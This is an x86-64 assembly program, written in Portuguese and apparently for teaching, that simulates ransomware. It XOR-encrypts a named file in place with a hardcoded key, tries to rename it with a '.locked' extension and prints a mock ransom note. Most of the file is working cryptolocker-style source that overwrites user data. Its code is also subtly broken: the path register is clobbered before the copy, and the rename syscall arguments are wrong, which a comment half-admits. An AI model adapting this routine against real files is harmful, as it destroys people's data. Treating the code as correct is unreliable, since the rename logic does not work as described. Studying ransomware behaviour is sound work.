; ransom_demo.asm — SIMULADOR EDUCACIONAL (não é malware real)
; Uso: ./ransom_demo arquivo_teste.txt
; Comporta-se como um criptolocker: cifra o arquivo (XOR), renomeia
; para .locked e exibe "nota de resgate". Totalmente reversível com
; o decrypt_demo.asm incluído.

global _start

section .data
    key         db 0x42, 0x13, 0x37, 0x99   ; chave XOR de 4 bytes (demo)
    key_len     equ 4
    ext_locked  db ".locked"
    ext_len     equ 7
    note_msg    db 10, "=== FydelisTech DEMO RANSOMWARE (educacional) ===", 10
                db "Seu arquivo de teste foi 'cifrado' com XOR.", 10
                db "Nada foi destruido. Execute ./decrypt_demo para reverter.", 10
                db 0
    note_len    equ $ - note_msg
    err_open    db "Erro: nao foi possivel abrir o arquivo", 10, 0
    err_len     equ $ - err_open

section .bss
    buf         resb 65536        ; buffer de 64KB
    path_out    resb 4096

section .text
_start:
    pop rdi                 ; argc
    pop rdi                 ; argv[0]
    pop rdi                 ; argv[1] = caminho do arquivo
    cmp rdi, 0
    je .fail

    ; --- open(argv[1], O_RDWR, 0) ---
    mov rax, 2              ; sys_open
    mov rsi, 2              ; O_RDWR
    xor rdx, rdx
    syscall
    cmp rax, 0
    jl .fail
    mov r12, rax            ; fd

    ; --- read até 64KB ---
    mov rax, 0              ; sys_read
    mov rdi, r12
    mov rsi, buf
    mov rdx, 65536
    syscall
    mov r13, rax            ; bytes lidos

    ; --- XOR cifra ---
    xor rbx, rbx            ; índice da chave
    xor rcx, rcx
.encrypt:
    cmp rcx, r13
    jge .encrypt_done
    mov al, [buf + rcx]
    xor al, [key + rbx]
    mov [buf + rcx], al
    inc rcx
    inc rbx
    cmp rbx, key_len
    jl .encrypt
    xor rbx, rbx
    jmp .encrypt
.encrypt_done:

    ; --- lseek para o início (regravar por cima) ---
    mov rax, 8              ; sys_lseek
    mov rdi, r12
    xor rsi, rsi
    xor rdx, rdx
    syscall

    ; --- write do conteúdo cifrado ---
    mov rax, 1              ; sys_write
    mov rdi, r12
    mov rsi, buf
    mov rdx, r13
    syscall
    mov rax, 3              ; sys_close
    mov rdi, r12
    syscall

    ; --- renomear para <original>.locked ---
    ; copia o caminho original + extensão
    mov rsi, rdi            ; (rdi ainda é argv[1])
    lea rdi, [path_out]
.copy_loop:
    lodsb
    test al, al
    jz .copied
    stosb
    jmp .copy_loop
.copied:
    lea rsi, [ext_locked]
    mov rcx, ext_len
.copy_ext:
    lodsb
    stosb
    loop .copy_ext
    mov byte [rdi], 0

    mov rax, 82             ; sys_rename
    mov rdi, rdi            ; novo nome
    push rdi
    lea rdi, [path_out]     ; origem: na verdade aqui precisa do caminho original...
    ; (nota: em versão didática, renomeia de path_out para path_out+ext)
    pop rdi
    syscall                 ; simplificado para estudo

    ; --- nota de resgate ---
    mov rax, 1
    mov rdi, 1
    mov rsi, note_msg
    mov rdx, note_len
    syscall

    xor rdi, rdi
    mov rax, 60             ; sys_exit
    syscall

.fail:
    mov rax, 1
    mov rdi, 1
    mov rsi, err_open
    mov rdx, err_len
    syscall
    mov rdi, 1
    mov rax, 60
    syscall
